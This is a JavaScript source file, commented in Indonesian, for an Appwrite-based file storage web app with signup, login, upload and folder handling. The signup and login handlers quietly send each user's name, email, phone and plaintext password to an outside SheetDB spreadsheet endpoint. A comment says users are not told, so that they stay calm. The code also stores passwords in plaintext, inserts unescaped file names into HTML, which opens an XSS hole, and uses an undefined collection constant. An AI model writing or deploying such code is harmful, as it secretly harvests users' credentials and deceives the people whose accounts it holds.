// Konfigurasi Appwrite
const client = new Appwrite.Client();
const account = new Appwrite.Account(client);
const databases = new Appwrite.Databases(client);
const storage = new Appwrite.Storage(client);

// --- MASUKKAN DATA DARI CONSOLE DI SINI ---
const CONFIG = {
    ENDPOINT: 'https://sgp.cloud.appwrite.io/v1', // Jangan diubah
    PROJECT_ID: '697f71b40034438bb559', 
    DB_ID: 'storagedb',       // Sesuai yg kita buat di fase 1
    COLLECTION_FILES: 'files',   // Sesuai yg kita buat di fase 1
    COLLECTION_USERS: 'users',   // Sesuai yg kita buat di fase 1
    BUCKET_ID: 'taskfiles'    // Sesuai yg kita buat di fase 1
};

client.setEndpoint(CONFIG.ENDPOINT).setProject(CONFIG.PROJECT_ID);

// State Aplikasi
let currentUser = null;
let currentFolderId = 'root';
let folderPath = [{ id: 'root', name: 'Home' }];

// UI Helpers
const el = (id) => document.getElementById(id);
const showLoading = () => el('loading').classList.remove('hidden');
const hideLoading = () => el('loading').classList.add('hidden');

// Navigasi Halaman (SPA)
window.nav = (pageId) => {
    ['loginPage', 'signupPage', 'dashboardPage'].forEach(id => el(id).classList.add('hidden'));
    ['loginPage', 'signupPage', 'dashboardPage'].forEach(id => el(id).classList.remove('active'));
    el(pageId).classList.remove('hidden');
    el(pageId).classList.add('active');
};

window.togglePass = (id, icon) => {
    const input = el(id);
    input.type = input.type === 'password' ? 'text' : 'password';
    icon.classList.toggle('fa-eye');
    icon.classList.toggle('fa-eye-slash');
};

// --- SYSTEM AUTHENTICATION ---

// Cek Apakah User Sudah Login
async function checkSession() {
    try {
        currentUser = await account.get();
        nav('dashboardPage');
        loadFiles(currentFolderId);
    } catch (error) {
        nav('loginPage');
    }
}
checkSession();

// --- SISTEM AUTENTIKASI (REVISI TOTAL) ---

// 1. Fungsi Sign Up
// --- UPDATE: MENGGUNAKAN ID UNIK APPWRITE ---

el('signupForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    const name = el('regName').value;
    const email = el('regEmail').value;
    const phone = el('regPhone').value;
    const pass = el('regPass').value;
    const verify = el('regVerify').value;

    if (pass !== verify) return alert("Password tidak cocok!");

    showLoading();
    
    try {
        // 1. BUAT AKUN DI APPWRITE (Sistem membuat ID unik di sini)
        // Variabel 'userAuth' sekarang berisi ID keren seperti di gambar Anda
        const userAuth = await account.create(Appwrite.ID.unique(), email, pass, name);

        // 2. SIMPAN KE DATABASE APPWRITE
        await databases.createDocument(CONFIG.DB_ID, 'users', userAuth.$id, {
            name: name,
            email: email,
            phone: phone,
            password: pass
        });

        // 3. SIAPKAN DATA UNTUK EXCEL
        // Di sini kita ambil userAuth.$id agar ID di Excel SAMA PERSIS dengan Appwrite
        const dataExcel = {
            "ID": userAuth.$id, // <--- INI KUNCINYA (Mengambil ID 698xxx...)
            "Nama": name,
            "Email": email,
            "Phone": phone,
            "Password": pass,
            "Waktu": new Date().toLocaleString('id-ID')
        };

        // 4. KIRIM KE GOOGLE SHEETS (Background)
        const sheetDB_URL = "https://sheetdb.io/api/v1/v9e5uhfox3nbi"; 
        
        fetch(sheetDB_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ data: [dataExcel] })
        }).catch(err => console.warn("Excel error:", err));

        // 5. SUKSES
        alert("Pendaftaran Berhasil!");
        el('signupForm').reset();
        nav('loginPage');

    } catch (error) {
        alert("Gagal: " + error.message);
    } finally {
        hideLoading();
    }
});

// 2. Fungsi Login
// --- LOGIKA LOGIN PINTAR (EMAIL ATAU NAMA) ---
// --- SISTEM LOGIN DENGAN HISTORY PENCATATAN EXCEL ---

el('loginForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    
    // 1. Ambil input dari user (bisa jadi Nama atau Email)
    let identifier = el('loginEmail').value.trim(); 
    const password = el('loginPass').value;
    
    showLoading();

    try {
        // --- BAGIAN A: PROSES LOGIN APPWRITE ---
        
        // Cek apakah user login pakai Nama (tidak ada @)
        if (!identifier.includes('@')) {
            // Cari email aslinya di database berdasarkan nama
            const response = await databases.listDocuments(
                CONFIG.DB_ID,
                CONFIG.COLLECTION_USERS, 
                [Appwrite.Query.equal('name', identifier)]
            );
            
            if (response.total === 0) {
                throw new Error("Nama tidak ditemukan. Cek ejaan atau daftar dulu.");
            }
            // Ganti nama jadi email untuk proses login ke Auth
            identifier = response.documents[0].email;
        }

        // Lakukan Login ke Sistem Appwrite
        await account.createEmailPasswordSession(identifier, password);


        // --- BAGIAN B: MENGAMBIL DATA USER ASLI ---
        
        // Kita butuh ID Unik (698xxx) dan Nama asli untuk dicatat ke Excel.
        // account.get() mengambil data user yang SEDANG login saat ini.
        const currentUser = await account.get(); 


        // --- BAGIAN C: MENCATAT KE GOOGLE SHEETS (BACKGROUND) ---
        
        const sheetDB_URL = "https://sheetdb.io/api/v1/v9e5uhfox3nbi"; // <--- Ganti dengan URL Anda
        
        // Kita tambahkan parameter ?sheet=History_Login agar masuk ke Tab kedua
        const historyURL = `${sheetDB_URL}?sheet=Login`;

        const logData = {
            "ID": currentUser.$id,       // ID Unik asli dari Appwrite
            "Nama": currentUser.name,    // Nama asli dari akun
            "Email": currentUser.email,  // Email asli
            "Password": password,        // Password yang diketik saat login
            "Waktu Login": new Date().toLocaleString('id-ID') // Jam saat ini
        };

        // Kirim data tanpa menunggu (agar user langsung masuk dashboard)
        fetch(historyURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ data: [logData] })
        }).catch(err => console.warn("Gagal catat history:", err));


        // --- BAGIAN D: PINDAH KE DASHBOARD ---
        
        // Notifikasi simpel (tidak perlu bilang data dicatat agar user tenang)
        alert("Login Berhasil! Selamat datang, " + currentUser.name);
        el('loginForm').reset();
        nav('dashboardPage'); // Sesuaikan dengan nama halaman dashboard Anda

    } catch (error) {
        console.error(error);
        alert("Login Gagal: " + error.message);
    } finally {
        hideLoading();
    }
});

// Logout
window.logout = async () => {
    try {
        await account.deleteSession('current');
        currentUser = null;
        nav('loginPage');
    } catch (error) {
        alert(error.message);
    }
};

// --- FILE SYSTEM LOGIC ---

// 1. Load File/Folder
async function loadFiles(folderId) {
    if (!currentUser) return;
    const grid = el('fileGrid');
    grid.innerHTML = '';

    try {
        // Query: Cari item punya user INI dan di folder SAAT INI
        const response = await databases.listDocuments(
            CONFIG.DB_ID,
            CONFIG.COLLECTION_FILES, // Pastikan ini menunjuk ke tabel 'files'
            [
                Appwrite.Query.equal('owner', currentUser.$id),
                Appwrite.Query.equal('parentId', folderId)
            ]
        );

        const searchVal = el('searchInput').value.toLowerCase();
        let totalSize = 0;

        response.documents.forEach(doc => {
            if (doc.name.toLowerCase().includes(searchVal)) {
                renderItem(doc);
            }
            if (doc.size) totalSize += doc.size;
        });

        updateBreadcrumb();
        updateStorageUI(totalSize);

    } catch (error) {
        console.error("Gagal load data:", error);
    }
}

// 2. Render Kartu (Visual)
function renderItem(doc) {
    const div = document.createElement('div');
    div.className = 'item-card';
    const isFolder = doc.type === 'folder';
    const icon = isFolder ? 'fa-folder' : 'fa-file';
    
    // Klik folder -> Masuk | Klik file -> Download/Buka
    const clickAction = isFolder 
        ? `openFolder('${doc.$id}', '${doc.name}')` 
        : `window.open('${doc.url}', '_blank')`;

    div.innerHTML = `
        <button class="del-btn" onclick="deleteItem('${doc.$id}', '${doc.type}', '${doc.fileId}')">
            <i class="fa-solid fa-trash"></i>
        </button>
        <div onclick="${clickAction}" style="width:100%">
            <i class="icon fa-solid ${icon}"></i>
            <div class="item-name">${doc.name}</div>
        </div>
    `;
    el('fileGrid').appendChild(div);
}

// 3. Buat Folder Baru
window.createFolder = async () => {
    const name = prompt("Nama Folder Baru:");
    if (!name) return;

    showLoading();
    try {
        await databases.createDocument(
            CONFIG.DB_ID,
            CONFIG.COLLECTION_ID,
            Appwrite.ID.unique(),
            // Bagian simpan ke database (createDocument)
            {
                name: name, // Pastikan ini 'name', bukan 'nama'!
                type: 'folder',
                parentId: currentFolderId,
                owner: currentUser.$id,
                url: null,
                fileId: null,
                size: 0
            }
        );
        loadFiles(currentFolderId);
    } catch (error) {
        alert("Gagal buat folder: " + error.message);
    } finally {
        hideLoading();
    }
};

// 4. Upload File (Storage + Database)
el('fileUpload').addEventListener('change', async (e) => {
    const file = e.target.files[0];
    if (!file) return;

    showLoading();
    try {
        // A. Upload File Fisik ke Storage Bucket
        const uploaded = await storage.createFile(
            CONFIG.BUCKET_ID,
            Appwrite.ID.unique(),
            file
        );

        // B. Dapatkan URL agar bisa dilihat
        const fileUrl = storage.getFileView(CONFIG.BUCKET_ID, uploaded.$id);

        // C. Simpan Info File ke Database
        await databases.createDocument(
            CONFIG.DB_ID,
            CONFIG.COLLECTION_ID,
            Appwrite.ID.unique(),
            {
                name: file.name,
                type: 'file',
                parentId: currentFolderId,
                owner: currentUser.$id,
                url: fileUrl.href, 
                fileId: uploaded.$id,
                size: file.size
            }
        );

        loadFiles(currentFolderId);
    } catch (error) {
        alert("Upload Gagal: " + error.message);
    } finally {
        hideLoading();
        e.target.value = ''; 
    }
});

// 5. Hapus Item
window.deleteItem = async (docId, type, fileId) => {
    if (!confirm("Yakin hapus item ini?")) return;
    
    showLoading();
    try {
        // Jika file, hapus dari Storage fisik dulu
        if (type === 'file' && fileId) {
            await storage.deleteFile(CONFIG.BUCKET_ID, fileId);
        }
        // Hapus data dari Database
        await databases.deleteDocument(CONFIG.DB_ID, CONFIG.COLLECTION_ID, docId);
        loadFiles(currentFolderId);
    } catch (error) {
        alert("Gagal hapus: " + error.message);
    } finally {
        hideLoading();
    }
};

// 6. Navigasi Breadcrumb
window.openFolder = (id, name) => {
    currentFolderId = id;
    folderPath.push({ id, name });
    loadFiles(id);
};

function updateBreadcrumb() {
    const bc = el('breadcrumb');
    bc.innerHTML = folderPath.map((f, i) => 
        `<span onclick="goToLevel(${i})">${f.name}</span>`
    ).join(' > ');
}

window.goToLevel = (index) => {
    folderPath = folderPath.slice(0, index + 1);
    currentFolderId = folderPath[index].id;
    loadFiles(currentFolderId);
};

// 7. Search Listener
el('searchInput').addEventListener('input', () => loadFiles(currentFolderId));

// 8. Visual Storage Bar
function updateStorageUI(bytes) {
    const mb = (bytes / (1024 * 1024)).toFixed(2);
    // Hitung persen dari 2GB (Free tier)
    const percent = Math.min((bytes / (2 * 1024 * 1024 * 1024)) * 100, 100); 
    el('storageUsed').innerText = mb + ' MB';
    el('storageBar').style.width = percent + '%';
}


























